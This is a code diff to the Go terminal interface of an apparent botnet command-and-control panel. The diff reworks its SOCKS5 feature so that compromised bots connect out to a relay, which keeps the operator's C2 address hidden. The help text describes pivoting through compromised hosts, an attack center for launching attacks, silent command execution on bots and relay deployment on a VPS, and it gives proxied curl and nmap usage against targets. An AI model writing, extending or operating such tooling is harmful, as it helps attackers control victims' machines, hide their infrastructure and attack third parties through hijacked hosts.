@@ -302,11 +302,11 @@ type TUIModel struct {
 	socksList      []SocksInfo
 	socksCursor    int
 	socksViewMode  int    // 0 = all, 1 = active, 2 = stopped
-	socksInputMode bool   // true when setting port/auth for a bot
-	socksInputStep int    // 0 = port, 1 = username, 2 = password
-	socksNewPort   string // Port to start socks on
-	socksNewUser   string // Optional proxy username
-	socksNewPass   string // Optional proxy password
+	socksInputMode  bool   // true when setting relay/auth for a bot
+	socksInputStep  int    // 0 = relay addr, 1 = username, 2 = password
+	socksNewRelay   string // Relay address (host:port) for backconnect
+	socksNewUser    string // Optional proxy username
+	socksNewPass    string // Optional proxy password
 
 	// Quit flag
 	quitting bool
@@ -326,11 +326,12 @@ type BotInfo struct {
 	Selected    bool
 }
 
-// SocksInfo holds display information about a socks proxy on a bot
+// SocksInfo holds display information about a socks backconnect on a bot
 type SocksInfo struct {
 	BotID     string    // Bot running the socks
-	BotIP     string    // Bot's IP address (for connecting)
-	Port      string    // Port socks is running on
+	BotIP     string    // Bot's IP address
+	Relay     string    // Relay address bot is connected to
+	Port      string    // Relay SOCKS port (for display, kept for compat)
 	Username  string    // Proxy auth username (empty = no auth)
 	Password  string    // Proxy auth password
 	Status    string    // "active", "stopped"
@@ -863,26 +864,26 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		}
 	}
 
-	// Handle socks input mode (port + optional user:pass)
+	// Handle socks input mode (relay addr + optional user:pass)
 	if m.currentView == ViewSocks && m.socksInputMode {
 		switch key {
 		case "esc":
 			m.socksInputMode = false
 			m.socksInputStep = 0
-			m.socksNewPort = ""
+			m.socksNewRelay = ""
 			m.socksNewUser = ""
 			m.socksNewPass = ""
 			return m, nil
 		case "tab":
-			// Cycle through fields: port -> user -> pass -> port
+			// Cycle through fields: relay -> user -> pass -> relay
 			m.socksInputStep = (m.socksInputStep + 1) % 3
 			return m, nil
 		case "enter":
-			if m.socksNewPort != "" && m.socksCursor < len(m.bots) {
+			if m.socksNewRelay != "" && m.socksCursor < len(m.bots) {
 				bot := m.bots[m.socksCursor]
 
-				// Send !socks command to start proxy on port
-				cmd := fmt.Sprintf("!socks %s", m.socksNewPort)
+				// Send !socks command to backconnect to relay
+				cmd := fmt.Sprintf("!socks %s", m.socksNewRelay)
 				sendToSingleBot(bot.ID, cmd)
 
 				// If credentials provided, send !socksauth to set them
@@ -895,7 +896,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 				newSocks := SocksInfo{
 					BotID:     bot.ID,
 					BotIP:     bot.IP,
-					Port:      m.socksNewPort,
+					Relay:     m.socksNewRelay,
 					Username:  m.socksNewUser,
 					Password:  m.socksNewPass,
 					Status:    "active",
@@ -911,7 +912,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 				m.socksList = append(m.socksList, newSocks)
 				m.socksInputMode = false
 				m.socksInputStep = 0
-				m.socksNewPort = ""
+				m.socksNewRelay = ""
 				m.socksNewUser = ""
 				m.socksNewPass = ""
 			}
@@ -919,8 +920,8 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		case "backspace":
 			switch m.socksInputStep {
 			case 0:
-				if len(m.socksNewPort) > 0 {
-					m.socksNewPort = m.socksNewPort[:len(m.socksNewPort)-1]
+				if len(m.socksNewRelay) > 0 {
+					m.socksNewRelay = m.socksNewRelay[:len(m.socksNewRelay)-1]
 				}
 			case 1:
 				if len(m.socksNewUser) > 0 {
@@ -936,9 +937,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			if len(key) == 1 {
 				switch m.socksInputStep {
 				case 0:
-					if key >= "0" && key <= "9" {
-						m.socksNewPort += key
-					}
+					m.socksNewRelay += key
 				case 1:
 					m.socksNewUser += key
 				case 2:
@@ -1096,11 +1095,51 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			m.toastExpiry = time.Now().Add(3 * time.Second)
 			return m, nil
 		}
-		// Start socks on selected bot (in socks view)
+		// Start socks backconnect on selected bot (in socks view)
+		// 's' = quick start with pre-configured relay + credentials (no input needed)
+		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
+			if m.socksCursor < len(m.bots) {
+				bot := m.bots[m.socksCursor]
+				// Send !socks with no args — bot uses its pre-configured relay endpoints + credentials
+				sendToSingleBot(bot.ID, "!socks")
+				// Track in socksList
+				newSocks := SocksInfo{
+					BotID:     bot.ID,
+					BotIP:     bot.IP,
+					Relay:     "(pre-configured)",
+					Username:  "(default)",
+					Password:  "(default)",
+					Status:    "active",
+					StartedAt: time.Now(),
+				}
+				for i, s := range m.socksList {
+					if s.BotID == bot.ID {
+						m.socksList = append(m.socksList[:i], m.socksList[i+1:]...)
+						break
+					}
+				}
+				m.socksList = append(m.socksList, newSocks)
+			}
+			return m, nil
+		}
+
+	case "c", "C":
+		// 'c' = custom: enter relay address + credentials manually
 		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
 			m.socksInputMode = true
 			m.socksInputStep = 0
-			m.socksNewPort = "1080"
+			m.socksNewRelay = ""
+			m.socksNewUser = ""
+			m.socksNewPass = ""
+			return m, nil
+		}
+
+	case "d", "D":
+		// 'd' = direct: open SOCKS5 listener directly on bot (no relay)
+		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
+			m.socksInputMode = true
+			m.socksInputStep = 0
+			m.socksNewRelay = "1080" // default port for direct mode
 			m.socksNewUser = ""
 			m.socksNewPass = ""
 			return m, nil
@@ -2318,7 +2357,7 @@ func (m TUIModel) viewSocks() string {
 	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
 	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
 
-	b.WriteString(headerStyle.Render("  🧦 SOCKS5 PROXY MANAGER"))
+	b.WriteString(headerStyle.Render("  🧦 SOCKS5 BACKCONNECT PROXY"))
 	b.WriteString("\n")
 
 	// View mode tabs
@@ -2345,14 +2384,14 @@ func (m TUIModel) viewSocks() string {
 	b.WriteString(fmt.Sprintf("  %s %s   %s %s   %s %s\n\n",
 		dim.Render("Bots:"), white.Render(fmt.Sprintf("%d", len(m.bots))),
 		dim.Render("Active Proxies:"), neonGreen.Render(fmt.Sprintf("%d", activeCount)),
-		dim.Render("Bind:"), neonYellow.Render("0.0.0.0")))
+		dim.Render("Mode:"), neonYellow.Render("Backconnect")))
 
 	// Build display list based on view mode
 	type displayItem struct {
 		botID    string
 		botIP    string
 		botArch  string
-		port     string
+		relay    string
 		status   string
 		started  time.Time
 		username string
@@ -2372,7 +2411,7 @@ func (m TUIModel) viewSocks() string {
 			// Check if this bot has active socks
 			for _, sock := range m.socksList {
 				if sock.BotID == bot.ID {
-					item.port = sock.Port
+					item.relay = sock.Relay
 					item.status = sock.Status
 					item.started = sock.StartedAt
 					item.username = sock.Username
@@ -2385,7 +2424,6 @@ func (m TUIModel) viewSocks() string {
 	case 1: // Active Socks only
 		for _, sock := range m.socksList {
 			if sock.Status == "active" {
-				// Find bot info
 				arch := ""
 				for _, bot := range m.bots {
 					if bot.ID == sock.BotID {
@@ -2397,7 +2435,7 @@ func (m TUIModel) viewSocks() string {
 					botID:    sock.BotID,
 					botIP:    sock.BotIP,
 					botArch:  arch,
-					port:     sock.Port,
+					relay:    sock.Relay,
 					status:   "active",
 					started:  sock.StartedAt,
 					username: sock.Username,
@@ -2419,7 +2457,7 @@ func (m TUIModel) viewSocks() string {
 					botID:    sock.BotID,
 					botIP:    sock.BotIP,
 					botArch:  arch,
-					port:     sock.Port,
+					relay:    sock.Relay,
 					status:   "stopped",
 					started:  sock.StartedAt,
 					username: sock.Username,
@@ -2438,7 +2476,7 @@ func (m TUIModel) viewSocks() string {
 		b.WriteString("\n")
 	} else {
 		// Table header
-		header := fmt.Sprintf("  %-18s %-16s %-10s %-8s %-10s %-20s", "BOT ID", "IP", "ARCH", "PORT", "STATUS", "AUTH")
+		header := fmt.Sprintf("  %-18s %-16s %-10s %-22s %-10s %-20s", "BOT ID", "IP", "ARCH", "RELAY", "STATUS", "AUTH")
 		b.WriteString(dim.Render(header))
 		b.WriteString("\n")
 		b.WriteString(dim.Render("  " + strings.Repeat("─", 86)))
@@ -2459,18 +2497,18 @@ func (m TUIModel) viewSocks() string {
 				style = botSelectedStyle
 			}
 
-			// Status + port display
-			var statusStyled, portDisplay string
+			// Status + relay display
+			var statusStyled, relayDisplay string
 			switch item.status {
 			case "active":
 				statusStyled = neonGreen.Render("● ACTIVE")
-				portDisplay = neonYellow.Render(item.port)
+				relayDisplay = neonYellow.Render(truncate(item.relay, 20))
 			case "stopped":
 				statusStyled = neonRed.Render("○ STOPPED")
-				portDisplay = dim.Render(item.port)
+				relayDisplay = dim.Render(truncate(item.relay, 20))
 			default:
 				statusStyled = dim.Render("- NONE")
-				portDisplay = dim.Render("-")
+				relayDisplay = dim.Render("-")
 			}
 
 			// Auth display
@@ -2489,7 +2527,7 @@ func (m TUIModel) viewSocks() string {
 				item.botArch,
 			)
 			b.WriteString(fmt.Sprintf("%s%s", cursor, style.Render(line)))
-			b.WriteString(fmt.Sprintf("%-8s ", portDisplay))
+			b.WriteString(fmt.Sprintf("%-22s ", relayDisplay))
 			b.WriteString(fmt.Sprintf("%-10s ", statusStyled))
 			b.WriteString(authDisplay)
 			b.WriteString("\n")
@@ -2507,7 +2545,7 @@ func (m TUIModel) viewSocks() string {
 
 	// Input mode or normal mode
 	if m.socksInputMode {
-		b.WriteString(neonPink.Bold(true).Render("  START SOCKS5 PROXY"))
+		b.WriteString(neonPink.Bold(true).Render("  START SOCKS5 BACKCONNECT"))
 		b.WriteString("\n")
 		if m.socksCursor < len(items) {
 			b.WriteString(fmt.Sprintf("  %s %s\n",
@@ -2515,16 +2553,20 @@ func (m TUIModel) viewSocks() string {
 				neonCyan.Render(items[m.socksCursor].botID)))
 		}
 		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
-		// Port field
-		portLabel := dim.Render("  Port:")
+		// Relay address field
+		relayLabel := dim.Render("  Relay:")
 		if m.socksInputStep == 0 {
-			portLabel = neonCyan.Render("  ▸ Port:")
+			relayLabel = neonCyan.Render("  ▸ Relay:")
 		}
-		portCursor := ""
+		relayCursor := ""
 		if m.socksInputStep == 0 {
-			portCursor = cursor
+			relayCursor = cursor
 		}
-		b.WriteString(fmt.Sprintf("%s %s%s\n", portLabel, neonGreen.Render(m.socksNewPort), portCursor))
+		relayHint := m.socksNewRelay
+		if relayHint == "" && m.socksInputStep != 0 {
+			relayHint = "(host:port)"
+		}
+		b.WriteString(fmt.Sprintf("%s %s%s\n", relayLabel, neonGreen.Render(relayHint), relayCursor))
 		// Username field
 		userLabel := dim.Render("  User:")
 		if m.socksInputStep == 1 {
@@ -2554,17 +2596,18 @@ func (m TUIModel) viewSocks() string {
 		}
 		b.WriteString(fmt.Sprintf("%s %s%s\n", passLabel, neonGreen.Render(passDisplay), passCursor))
 		b.WriteString("\n")
-		b.WriteString(dim.Render("  [tab] Next field   [enter] Start   [esc] Cancel"))
+		b.WriteString(dim.Render("  [tab] Next field   [enter] Connect   [esc] Cancel"))
 		b.WriteString("\n")
 	} else {
 		// Hotkey help
 		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
-		b.WriteString(fmt.Sprintf("  %s Start Socks   %s Stop Socks   %s/%s View   %s Refresh   %s Back\n",
+		b.WriteString(fmt.Sprintf("  %s Relay   %s Custom   %s Direct   %s Stop   %s/%s View   %s Back\n",
 			hotkey.Render("[s]"),
+			hotkey.Render("[c]"),
+			hotkey.Render("[d]"),
 			hotkey.Render("[x]"),
 			hotkey.Render("[←]"),
 			hotkey.Render("[→]"),
-			hotkey.Render("[r]"),
 			hotkey.Render("[q]")))
 	}
 
@@ -2956,7 +2999,7 @@ func (m TUIModel) viewHelp() string {
 			{"BOT MANAGEMENT", "View and manage connected bots"},
 			{"ATTACK CENTER", "Configure and launch attacks"},
 			{"BROADCAST SHELL", "Send commands to all bots"},
-			{"SOCKS MANAGER", "SOCKS5 proxy management"},
+			{"SOCKS MANAGER", "SOCKS5 backconnect proxy"},
 			{"HELP & INFO", "This documentation (you are here)"},
 		}
 		for _, mi := range menuItems {
@@ -3076,7 +3119,8 @@ func (m TUIModel) viewHelp() string {
 			{"!exec <cmd>", "Execute command silently"},
 			{"!detach <cmd>", "Execute in background"},
 			{"!info", "Request bot system information"},
-			{"!socks <port>", "Start SOCKS5 proxy on port"},
+			{"!socks <port>", "Direct SOCKS5 listener on bot"},
+			{"!socks <relay:port>", "Backconnect to relay server"},
 			{"!stopsocks", "Stop SOCKS5 proxy"},
 		}
 		for _, c := range cmds {
@@ -3129,22 +3173,24 @@ func (m TUIModel) viewHelp() string {
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("!          "), dim.Render("Sent directly (e.g. !info, !detach ls)")))
 
 	case 5: // SOCKS Proxy
-		b.WriteString(neonPurple.Bold(true).Render("  🧦 SOCKS5 PROXY MANAGER"))
+		b.WriteString(neonPurple.Bold(true).Render("  🧦 SOCKS5 BACKCONNECT PROXY"))
 		b.WriteString("\n\n")
 
 		b.WriteString(neonOrange.Render("  Overview") + "\n")
-		b.WriteString(white.Render("  Start SOCKS5 reverse proxies on any connected bot.") + "\n")
-		b.WriteString(white.Render("  Route traffic through compromised hosts for pivoting.") + "\n\n")
+		b.WriteString(white.Render("  Bots connect OUT to a relay server (backconnect).") + "\n")
+		b.WriteString(white.Render("  SOCKS5 clients connect to the relay — bot never opens a port.") + "\n")
+		b.WriteString(white.Render("  C2 address stays hidden; relay is separate infrastructure.") + "\n\n")
 
 		b.WriteString(neonOrange.Render("  Controls") + "\n")
 		socksKeys := []struct{ key, desc string }{
 			{"↑ / ↓", "Select a bot from the list"},
-			{"s", "Start SOCKS5 on selected bot (enter port)"},
-			{"x", "Stop SOCKS5 on selected bot"},
+			{"s", "Quick start (pre-configured relay + creds)"},
+			{"c", "Custom relay (enter relay:port + creds)"},
+			{"d", "Direct mode (open SOCKS5 port on bot)"},
+			{"x", "Stop proxy on selected bot"},
 			{"← / →", "Switch view: All / Active / Stopped"},
-			{"enter", "Confirm port and start proxy"},
-			{"esc", "Cancel port input"},
-			{"r", "Refresh bot and proxy status"},
+			{"enter", "Confirm and connect (custom mode)"},
+			{"esc", "Cancel input"},
 			{"q", "Back to main menu"},
 		}
 		for _, k := range socksKeys {
@@ -3153,22 +3199,15 @@ func (m TUIModel) viewHelp() string {
 				white.Render(k.desc)))
 		}
 
-		b.WriteString("\n" + neonOrange.Render("  View Modes") + "\n")
-		viewModes := []struct{ mode, desc string }{
-			{"All Bots", "Every connected bot (start proxy on any)"},
-			{"Active", "Only bots with running SOCKS5 proxies"},
-			{"Stopped", "Bots with previously stopped proxies"},
-		}
-		for _, v := range viewModes {
-			b.WriteString(fmt.Sprintf("  %s %s\n",
-				neonCyan.Render(fmt.Sprintf("%-12s", v.mode)),
-				dim.Render(v.desc)))
-		}
+		b.WriteString("\n" + neonOrange.Render("  Relay Setup") + "\n")
+		b.WriteString(white.Render("  1. Deploy relay binary on a VPS: ./relay -key <magic_code>") + "\n")
+		b.WriteString(white.Render("  2. Use !socks <relay:control_port> to connect bots") + "\n")
+		b.WriteString(white.Render("  3. SOCKS5 clients connect to relay's SOCKS port (default :1080)") + "\n\n")
 
-		b.WriteString("\n" + neonOrange.Render("  Usage After Starting") + "\n")
-		b.WriteString(white.Render("  curl --socks5 BOT_IP:PORT http://target.com") + "\n")
+		b.WriteString(neonOrange.Render("  Usage") + "\n")
+		b.WriteString(white.Render("  curl --socks5 RELAY_IP:1080 http://target.com") + "\n")
 		b.WriteString(white.Render("  proxychains4 nmap -sT target.com") + "\n")
-		b.WriteString(dim.Render("  Default port: 1080. Binds on 0.0.0.0.") + "\n")
+		b.WriteString(dim.Render("  Relay endpoints can be pre-configured in setup.py") + "\n")
 
 	case 6: // Network & Security
 		b.WriteString(neonOrange.Bold(true).Render("  🔒 NETWORK & SECURITY"))
